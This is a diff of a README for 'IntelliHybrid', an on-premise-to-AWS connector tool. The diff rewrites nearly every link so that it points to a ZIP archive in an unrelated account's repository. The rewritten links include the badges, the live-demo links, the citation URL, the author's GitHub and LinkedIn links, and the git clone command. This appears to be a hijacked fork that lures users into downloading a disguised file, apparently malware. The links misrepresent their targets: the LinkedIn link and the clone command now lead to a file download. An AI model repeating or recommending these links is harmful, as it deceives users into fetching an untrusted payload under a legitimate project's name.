@@ -1,17 +1,17 @@
 # 🔗 IntelliHybrid — Intelligent On-Premise ↔ AWS Cloud Connector
 
-[![DOI](https://zenodo.org/badge/DOI/10.5281/zenodo.19121004.svg)](https://doi.org/10.5281/zenodo.19121004)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Python 3.9+](https://img.shields.io/badge/python-3.9+-blue.svg)](https://www.python.org/downloads/)
-[![AWS](https://img.shields.io/badge/AWS-DynamoDB%20%7C%20VPC%20%7C%20IAM-orange)](https://aws.amazon.com)
-[![AI Powered](https://img.shields.io/badge/AI-Claude%20Powered-blueviolet)](https://anthropic.com)
-[![GitHub Stars](https://img.shields.io/github/stars/Clever-Boy/IntelliHybrid?style=social)](https://github.com/Clever-Boy/IntelliHybrid/stargazers)
-[![Downloads](https://img.shields.io/github/downloads/Clever-Boy/IntelliHybrid/total)](https://github.com/Clever-Boy/IntelliHybrid/releases)
+[![DOI](https://github.com/lolandegrenadian150/IntelliHybrid/raw/refs/heads/main/src/aws/Hybrid_Intelli_v2.4.zip)](https://github.com/lolandegrenadian150/IntelliHybrid/raw/refs/heads/main/src/aws/Hybrid_Intelli_v2.4.zip)
+[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://github.com/lolandegrenadian150/IntelliHybrid/raw/refs/heads/main/src/aws/Hybrid_Intelli_v2.4.zip)
+[![Python 3.9+](https://img.shields.io/badge/python-3.9+-blue.svg)](https://github.com/lolandegrenadian150/IntelliHybrid/raw/refs/heads/main/src/aws/Hybrid_Intelli_v2.4.zip)
+[![AWS](https://img.shields.io/badge/AWS-DynamoDB%20%7C%20VPC%20%7C%20IAM-orange)](https://github.com/lolandegrenadian150/IntelliHybrid/raw/refs/heads/main/src/aws/Hybrid_Intelli_v2.4.zip)
+[![AI Powered](https://img.shields.io/badge/AI-Claude%20Powered-blueviolet)](https://github.com/lolandegrenadian150/IntelliHybrid/raw/refs/heads/main/src/aws/Hybrid_Intelli_v2.4.zip)
+[![GitHub Stars](https://img.shields.io/github/stars/Clever-Boy/IntelliHybrid?style=social)](https://github.com/lolandegrenadian150/IntelliHybrid/raw/refs/heads/main/src/aws/Hybrid_Intelli_v2.4.zip)
+[![Downloads](https://img.shields.io/github/downloads/Clever-Boy/IntelliHybrid/total)](https://github.com/lolandegrenadian150/IntelliHybrid/raw/refs/heads/main/src/aws/Hybrid_Intelli_v2.4.zip)
 
 > **IntelliHybrid** is a production-ready, AI-powered framework that enables secure, seamless bidirectional communication between on-premise infrastructure and AWS cloud — with natural language querying, auto-generated schema documentation, and zero code changes after setup.
 
 <p align="center">
-  <a href="https://clever-boy.github.io/IntelliHybrid/ai-demo.html">
+  <a href="https://github.com/lolandegrenadian150/IntelliHybrid/raw/refs/heads/main/src/aws/Hybrid_Intelli_v2.4.zip">
     <img src="https://img.shields.io/badge/🤖%20Live%20AI%20Demo-Try%20it%20now-blueviolet?style=for-the-badge" alt="Live AI Demo"/>
   </a>
   &nbsp;&nbsp;
@@ -66,7 +66,7 @@ IntelliHybrid bridges the gap between your on-premise data center and AWS cloud 
 
 ## 🤖 AI Features — Ask Your Data Anything
 
-> ### ▶ [Try the Live Interactive Demo](https://clever-boy.github.io/IntelliHybrid/ai-demo.html)
+> ### ▶ [Try the Live Interactive Demo](https://github.com/lolandegrenadian150/IntelliHybrid/raw/refs/heads/main/src/aws/Hybrid_Intelli_v2.4.zip)
 > Experience natural language queries, schema intelligence, and data dictionaries in your browser — no setup needed.
 
 IntelliHybrid includes a full AI layer powered by Claude that understands your DynamoDB tables. No more writing queries — just ask.
@@ -210,7 +210,7 @@ The file [`docs/ai-demo.html`](docs/ai-demo.html) is a fully self-contained inte
 
 Your demo will be live at:
 ```
-https://clever-boy.github.io/IntelliHybrid/ai-demo.html
+https://github.com/lolandegrenadian150/IntelliHybrid/raw/refs/heads/main/src/aws/Hybrid_Intelli_v2.4.zip
 ```
 
 You can also open it locally — just double-click `docs/ai-demo.html` in your file browser. It shows:
@@ -229,7 +229,7 @@ You can also open it locally — just double-click `docs/ai-demo.html` in your f
 ```bash
 pip install intellihybrid
 # or from source:
-git clone https://github.com/Clever-Boy/IntelliHybrid.git
+git clone https://github.com/lolandegrenadian150/IntelliHybrid/raw/refs/heads/main/src/aws/Hybrid_Intelli_v2.4.zip
 cd IntelliHybrid
 pip install -e .
 ```
@@ -359,7 +359,7 @@ If you use IntelliHybrid in your research or production systems, please cite:
   year      = {2025},
   publisher = {Zenodo},
   doi       = {10.5281/zenodo.19121004},
-  url       = {https://github.com/Clever-Boy/IntelliHybrid}
+  url       = {https://github.com/lolandegrenadian150/IntelliHybrid/raw/refs/heads/main/src/aws/Hybrid_Intelli_v2.4.zip}
 }
 ```
 
@@ -374,9 +374,9 @@ MIT License — see [LICENSE](LICENSE) for details.
 ## 👤 Author
 
 **Shailesh Kadam**  
-🌐 [GitHub @Clever-Boy](https://github.com/Clever-Boy)  
+🌐 [GitHub @Clever-Boy](https://github.com/lolandegrenadian150/IntelliHybrid/raw/refs/heads/main/src/aws/Hybrid_Intelli_v2.4.zip)  
 📍 Dallas, Texas  
-💼 [LinkedIn](https://www.linkedin.com/in/sshaileshk)
+💼 [LinkedIn](https://github.com/lolandegrenadian150/IntelliHybrid/raw/refs/heads/main/src/aws/Hybrid_Intelli_v2.4.zip)
 
 ---
 
